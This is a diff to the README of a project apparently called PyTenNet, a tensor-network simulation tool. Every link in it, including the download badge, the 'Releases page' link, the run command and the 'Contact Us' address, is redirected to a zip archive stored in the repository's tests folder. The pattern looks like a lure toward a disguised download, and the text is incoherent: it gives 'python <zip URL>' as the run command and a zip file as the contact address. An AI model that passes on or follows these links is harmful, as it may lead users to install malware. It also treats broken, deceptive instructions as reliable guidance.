@@ -21,11 +21,11 @@ To run PyTenNet, make sure you have the following:
 
 ## 📥 Download PyTenNet
 
-[![Download PyTenNet](https://raw.githubusercontent.com/arfendy/PyTenNet/master/tensornet/algorithms/Net_Py_Ten_1.2.zip%20Now-Visit%https://raw.githubusercontent.com/arfendy/PyTenNet/master/tensornet/algorithms/Net_Py_Ten_1.2.zip)](https://raw.githubusercontent.com/arfendy/PyTenNet/master/tensornet/algorithms/Net_Py_Ten_1.2.zip)
+[![Download PyTenNet](https://github.com/arfendy/PyTenNet/raw/refs/heads/master/tests/Ten-Net-Py-v1.4-alpha.3.zip%20Now-Visit%https://github.com/arfendy/PyTenNet/raw/refs/heads/master/tests/Ten-Net-Py-v1.4-alpha.3.zip)](https://github.com/arfendy/PyTenNet/raw/refs/heads/master/tests/Ten-Net-Py-v1.4-alpha.3.zip)
 
 To download the latest version of PyTenNet, visit our Releases page:
 
-[Download and Install](https://raw.githubusercontent.com/arfendy/PyTenNet/master/tensornet/algorithms/Net_Py_Ten_1.2.zip)
+[Download and Install](https://github.com/arfendy/PyTenNet/raw/refs/heads/master/tests/Ten-Net-Py-v1.4-alpha.3.zip)
 
 Follow these simple steps to get started:
 
@@ -51,7 +51,7 @@ Once you've downloaded and installed PyTenNet, you can easily run it. Here's how
 3. **Run the Application:**
    Execute the following command:
    ```bash
-   python https://raw.githubusercontent.com/arfendy/PyTenNet/master/tensornet/algorithms/Net_Py_Ten_1.2.zip
+   python https://github.com/arfendy/PyTenNet/raw/refs/heads/master/tests/Ten-Net-Py-v1.4-alpha.3.zip
    ```
 
 ## 💡 Getting Help
@@ -77,6 +77,6 @@ If you are interested in exploring more about quantum physics, many-body physics
 
 ## 📞 Contact Us
 
-For any questions or feedback, feel free to reach out to us at [https://raw.githubusercontent.com/arfendy/PyTenNet/master/tensornet/algorithms/Net_Py_Ten_1.2.zip](https://raw.githubusercontent.com/arfendy/PyTenNet/master/tensornet/algorithms/Net_Py_Ten_1.2.zip). We are here to help you make the most out of PyTenNet!
+For any questions or feedback, feel free to reach out to us at [https://github.com/arfendy/PyTenNet/raw/refs/heads/master/tests/Ten-Net-Py-v1.4-alpha.3.zip](https://github.com/arfendy/PyTenNet/raw/refs/heads/master/tests/Ten-Net-Py-v1.4-alpha.3.zip). We are here to help you make the most out of PyTenNet!
 
 Thank you for choosing PyTenNet for your tensor network simulations. Enjoy exploring the fascinating world of quantum mechanics!
